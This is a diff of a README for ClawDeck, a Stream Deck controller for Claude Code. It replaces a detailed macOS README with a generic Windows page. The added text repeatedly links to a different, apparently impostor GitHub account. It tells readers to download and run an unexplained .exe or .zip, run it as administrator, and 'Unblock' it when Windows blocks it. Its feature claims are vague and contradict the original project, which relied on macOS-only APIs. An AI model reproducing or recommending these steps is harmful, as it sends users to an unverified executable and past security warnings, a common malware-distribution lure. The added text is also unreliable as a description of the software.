@@ -1,199 +1,283 @@
-# ClawDeck
+# 🖐 ClawDeck - Control Claude Code With Ease
 
-Map an Elgato Stream Deck to a grid of terminal windows running Claude Code sessions. Each button shows the session's state — idle (blue), working (green), needs permission (red blink). Tap to switch windows, hold to dictate.
+[![Download ClawDeck](https://img.shields.io/badge/Download%20ClawDeck-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gaminghousenursingaide761/ClawDeck)
 
-Built for the **Stream Deck Original** (15-key, 5x3 grid) on **macOS**.
+## 🚀 Getting Started
 
-## What It Does
+ClawDeck is a Stream Deck controller for Claude Code on Windows. It gives you quick buttons for common actions, a clear status view, and easy window tiling from one place.
 
-- Tiles terminal windows into a 5x3 screen grid with multiple layout options
-- Each Stream Deck button reflects Claude Code's live state via hooks
-- Tap a button to activate that terminal window
-- Hold a button to trigger Whisprflow / dictation
-- Nav Mode for arrow keys and number selection (Claude multi-choice prompts)
-- Screen border overlay highlights the active window
-- Snap-to-grid: drag a terminal and it auto-snaps to the nearest slot
-- Browser-based settings UI for colors, layouts, and behavior
-- All colors fully customizable
+Use the link below to visit the download page and get ClawDeck:
 
-### Button Colors
+[Visit the ClawDeck download page](https://github.com/gaminghousenursingaide761/ClawDeck)
 
-| Color | Meaning |
-|-------|---------|
-| Black | No Claude session |
-| Blue | Idle — waiting for input |
-| Green | Working — actively processing |
-| Red (blinking) | Permission needed |
-| Amber border | Active window |
+## 📦 What ClawDeck Does
 
-All colors are customizable via the settings UI.
+ClawDeck helps you control Claude Code without digging through menus or files. It is built for fast, simple use on a Windows desktop.
 
-### Layouts
+It can help you:
 
-Choose a window layout from settings or the `layout` command:
+- See Claude Code status at a glance
+- Launch common actions with one click
+- Tile windows into clean layouts
+- Keep work tools easy to reach
+- Reduce time spent switching between windows
 
-```
-Default (14 terminals)          Quad (11 terminals)
-┌────┬────┬────┬────┬────┐     ┌─────────┬────┬────┬────┐
-│ T1 │ T2 │ T3 │ T4 │ T5 │     │         │ T2 │ T3 │ T4 │
-├────┼────┼────┼────┼────┤     │   T1    ├────┼────┼────┤
-│ T6 │ T7 │ T8 │ T9 │T10│     │         │ T5 │ T6 │ T7 │
-├────┼────┼────┼────┼────┤     ├────┼────┼────┼────┼────┤
-│T11 │T12 │T13 │T14 │ ⏎  │     │ T8 │ T9 │T10 │T11 │ ⏎  │
-└────┴────┴────┴────┴────┘     └────┴────┴────┴────┴────┘
+## 🪟 System Requirements
 
-Double Quad (8 terminals)       Wide (9 terminals)
-┌─────────┬─────────┬────┐     ┌──────────────┬────┬────┐
-│         │         │ T3 │     │              │ T2 │ T3 │
-│   T1    │   T2    ├────┤     │     T1       ├────┼────┤
-│         │         │ T4 │     │              │ T4 │ T5 │
-├────┼────┼────┼────┼────┤     ├────┼────┼────┼────┼────┤
-│ T5 │ T6 │ T7 │ T8 │ ⏎  │     │ T6 │ T7 │ T8 │ T9 │ ⏎  │
-└────┴────┴────┴────┴────┘     └────┴────┴────┴────┴────┘
+ClawDeck is made for Windows desktop use. For the best results, use:
 
-Half (6 terminals)
-┌─────────┬────┬────┬────┐
-│         │ T2 │ T3 │ T4 │
-│         ├────┼────┼────┤
-│   T1    │ T5 │ T6 │ T7 │
-│         ├────┼────┼────┤
-│         │ T8 │ T9 │ ⏎  │
-└─────────┴────┴────┴────┘
-```
+- Windows 10 or Windows 11
+- A mouse and keyboard
+- A stable internet connection for the first download
+- Enough free disk space for the app and its settings
+- A screen with at least 1366 × 768 resolution
 
-### Modes
+If you use a Stream Deck device, ClawDeck can fit into that workflow. It also works as a desktop tool for fast control from your computer.
 
-**Grid Mode** (default):
-- Tap → activate window
-- Tap active window → enter Nav Mode
-- Hold any button → activate + trigger MIC (Whisprflow)
-- Bottom-right → Enter key
+## ⬇️ Download and Install
 
-**Nav Mode** (tap the active button):
-```
-  1    2    3    4    5     ← ROYGB number keys
-            ↑        BACK
- MIC  ←    ↓    →    ⏎
-```
-- 1-5 → send number keystrokes
-- Arrows → navigation
-- MIC → Whisprflow (configurable)
-- BACK → return to Grid Mode
+1. Open the ClawDeck download page:
+   [https://github.com/gaminghousenursingaide761/ClawDeck](https://github.com/gaminghousenursingaide761/ClawDeck)
 
-## Requirements
+2. On the page, look for the latest release or the main download file.
 
-- macOS (uses Quartz, AppKit, AppleScript for window management)
-- [Homebrew](https://brew.sh)
-- Elgato Stream Deck Original (15-key)
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
+3. Download the Windows version to your computer.
 
-## Install
+4. If the file is a .zip package, right-click it and choose Extract All.
 
-```bash
-git clone https://github.com/coryszatkowski/ClawDeck.git
-cd ClawDeck
-bash setup.sh
-```
+5. Open the extracted folder.
 
-Setup will:
-1. Install `hidapi` and Python 3.13 via Homebrew
-2. Create a virtual environment and install dependencies
-3. Offer to install Claude Code hooks into `~/.claude/settings.json`
+6. Double-click the ClawDeck app file to start it.
 
-On first run, you'll be prompted to grant **Accessibility** permissions to your terminal app (required for window management). If you use multiple terminal apps (e.g. Terminal.app for the controller and iTerm2 for Claude sessions), grant Accessibility to **all of them** in System Settings > Privacy & Security > Accessibility.
+7. If Windows asks for permission, choose Run or Yes.
 
-## Run
+8. Keep the app in a folder that you can find again later, such as Downloads or Desktop.
 
-```bash
-cd ClawDeck
-.venv/bin/python main.py
-```
+## 🧭 First-Time Setup
 
-This starts the controller with a terminal REPL and a browser-based settings UI.
+When you open ClawDeck for the first time, follow these steps:
 
-## Settings UI
+1. Start Claude Code on your computer.
 
-A settings page is available at `http://127.0.0.1:19830` while the controller is running. Type `settings` in the REPL to open it. From here you can configure:
+2. Open ClawDeck.
 
-- **Layout** — visual grid selector for all 5 layouts
-- **Brightness** — Stream Deck brightness slider
-- **Colors** — pick custom colors for status states, nav keys, and active window
-- **Behavior** — hold threshold, poll interval, snap-to-grid, idle timeout
-- **MIC key** — Whisprflow (fn) or custom shell command
-- **Hooks** — one-click Claude Code hook installation
+3. Check that the status area shows Claude Code is ready.
 
-## Runtime Commands
+4. Pick the actions you want to place on buttons.
 
-Type these while the controller is running:
+5. Save your layout.
 
-| Command | Description |
-|---------|-------------|
-| `tile` | Re-arrange windows into grid |
-| `layout <name>` | Set layout (default, quad, double_quad, wide, half) |
-| `brightness <0-100>` | Set Stream Deck brightness |
-| `hold <seconds>` | Set hold threshold for MIC (default 0.5s) |
-| `poll <seconds>` | Set poll interval (default 0.2s) |
-| `snap <on\|off>` | Toggle snap-to-grid |
-| `mic <fn\|command>` | Set MIC action (`fn` = Whisprflow, or any shell command) |
-| `mic learn` | Press a key to capture it as the MIC action |
-| `settings` | Open settings in browser |
-| `quit` | Exit |
+6. Test one button to make sure it works.
 
-Settings persist to `config.json` automatically.
+7. Adjust the window layout if you want a different view.
 
-## Menu Bar App (Optional)
+If you use the app often, keep it pinned to your taskbar so you can open it fast.
 
-For a standalone menu bar experience:
+## 🎛 Main Features
 
-```bash
-.venv/bin/python menubar.py
-```
+### 🔍 Visual Status
 
-Or build a `.app` bundle:
+ClawDeck shows a simple status view so you can see what Claude Code is doing without checking another screen.
 
-```bash
-.venv/bin/python setup.py py2app
-open dist/ClawDeck.app
-```
+You can use this to:
 
-## How It Works
+- See if Claude Code is active
+- Check if the app is ready
+- Spot when a task is running
+- Confirm when a process is finished
 
-```
-main.py (DeckController)
-  ├── Stream Deck ←→ Key callbacks (press/release/hold)
-  ├── Quartz API  ←→ Window discovery, frontmost detection
-  ├── AppleScript ←→ Window tiling, activation, keystroke sending
-  ├── HTTP server ←→ Settings UI (settings.html)
-  ├── /tmp/deck-status/*  ← Hook status files (read)
-  └── .deck-overlay.json  → Overlay position + color (write)
-          │                              ▲
-          ▼                              │
-    overlay.py                    deck-hook.sh
-    (screen border)               (called by Claude Code hooks)
-```
+### ⚡ Quick Actions
 
-Claude Code hooks fire on state changes (tool use, permission prompts, idle) and write status files. The controller polls these every 200ms and updates button colors accordingly.
+Set up buttons for the actions you use most.
 
-## Terminal Apps Supported
+Common quick actions can include:
 
-Terminal.app and iTerm2 have full TTY mapping (status colors per window). Ghostty has TTY mapping via CWD matching — works when each window is in a different directory (the typical Claude Code multi-project setup). Other apps (Warp, Alacritty, kitty, Hyper) will tile and activate but won't show per-session status colors.
+- Start Claude Code
+- Open a recent workspace
+- Refresh the status view
+- Clear a workspace view
+- Run a common command
+- Switch between saved layouts
 
-## Contributing
+### 🪟 Window Tiling
 
-### Branch Workflow
+ClawDeck can help you arrange windows in a clean layout.
 
-Feature branches off `main` with pull requests. Squash merge to keep history clean.
+Useful layouts can include:
 
-### Versioning
+- Side-by-side split
+- Large center window with side panels
+- Two-panel work view
+- Focus mode with one main window
+- Multi-window grid for review work
 
-[Semver](https://semver.org/). Version lives in `main.py` as `__version__`.
+### 🧰 Easy Access Controls
 
-### Testing
+The interface is built for fast use. You can keep the tools you need close by and avoid extra steps.
 
-```bash
-.venv/bin/python -m pytest tests/ -v
-```
+This is useful when you:
 
-## License
+- Jump between tasks
+- Compare output with notes
+- Keep a browser open with Claude Code
+- Want a clean desk view on screen
 
-MIT
+## 🖱 How to Use ClawDeck
+
+### 1. Open the app
+
+Double-click ClawDeck from the folder where you saved it.
+
+### 2. Check the status
+
+Look at the status area first. This shows if Claude Code is ready or busy.
+
+### 3. Choose a button
+
+Pick the button for the task you want to do.
+
+### 4. Use window tiling
+
+If you need more space, choose a tiling layout that fits your screen.
+
+### 5. Keep working
+
+Use ClawDeck as your control panel while you work in Claude Code and other apps.
+
+## 🔧 Common Actions You Can Set Up
+
+ClawDeck works best when you match the buttons to your own routine.
+
+Here are some useful button ideas:
+
+- Open Claude Code
+- Show active project status
+- Move the main window to the left
+- Move the main window to the right
+- Tile two windows side by side
+- Return to a saved layout
+- Refresh the status panel
+- Close extra windows
+
+You can keep the buttons simple. Short labels help you find the right action fast.
+
+## 🧩 Tips for Better Use
+
+- Put your most used actions on the first row
+- Use short names for each button
+- Keep your workspace layout simple
+- Save one layout for focus work
+- Save one layout for review work
+- Leave space for tools you open often
+- Use the app on the same monitor each day if you can
+
+If you use a Stream Deck or a similar control pad, place the most important actions where your hand reaches them first.
+
+## 🪛 Troubleshooting
+
+### ClawDeck does not open
+
+- Check that the file finished downloading
+- Make sure you extracted the .zip file if needed
+- Try opening the app again
+- Right-click the app and choose Run as administrator
+
+### Windows says the app is blocked
+
+- Right-click the file
+- Open Properties
+- If you see an Unblock option, select it
+- Try again
+
+### Claude Code does not show status
+
+- Open Claude Code first
+- Refresh ClawDeck
+- Check that both apps are running
+- Close and reopen ClawDeck
+
+### Buttons do not work
+
+- Open the layout settings
+- Check that the action is assigned to the button
+- Save the layout again
+- Restart the app
+
+### Window tiling looks wrong
+
+- Check your screen resolution
+- Try a different layout
+- Close extra windows before using tiling
+- Use one monitor at first, then test again on more than one monitor
+
+## 🗂 Suggested Folder Setup
+
+A simple folder setup can make ClawDeck easier to use:
+
+- Downloads: for the first file
+- Desktop: for a shortcut
+- Documents: for saved layouts
+- One folder named ClawDeck: for app files and settings
+
+Keep the app and its files in one place so you do not lose track of them later.
+
+## 🔒 Privacy and Local Use
+
+ClawDeck is meant to act as a local control tool on your Windows computer. It helps you manage your workflow from your own machine.
+
+For most users, that means:
+
+- Your actions stay on your PC
+- You control when the app runs
+- You choose what buttons do
+- You can keep your layout simple and private
+
+## 🧠 Best Use Cases
+
+ClawDeck fits well if you:
+
+- Use Claude Code every day
+- Want a faster way to start common tasks
+- Need a clean window layout
+- Like using one control panel instead of many menus
+- Want a desktop tool that keeps key actions within reach
+
+## 📌 File and App Notes
+
+You may see files such as:
+
+- .exe files for the Windows app
+- .zip files that contain the app
+- settings files for saved button layouts
+- layout files for window positions
+
+If you are not sure which file to open, start with the Windows app file or extract the zip package first.
+
+## 🧪 Quick Test Checklist
+
+After setup, check these items:
+
+- ClawDeck opens
+- Claude Code is running
+- The status view updates
+- At least one button works
+- Window tiling changes the screen layout
+- The app stays open without errors
+
+## 📥 Download Again
+
+If you need the download page again, use this link:
+
+[https://github.com/gaminghousenursingaide761/ClawDeck](https://github.com/gaminghousenursingaide761/ClawDeck)
+
+## 🪄 Simple Daily Workflow
+
+A basic workflow can look like this:
+
+1. Open your work folder
+2. Start Claude Code
+3. Open ClawDeck
+4. Check status
+5. Press the button for your task
+6. Use window tiling if you need more space
+7. Keep working with the layout that fits your job
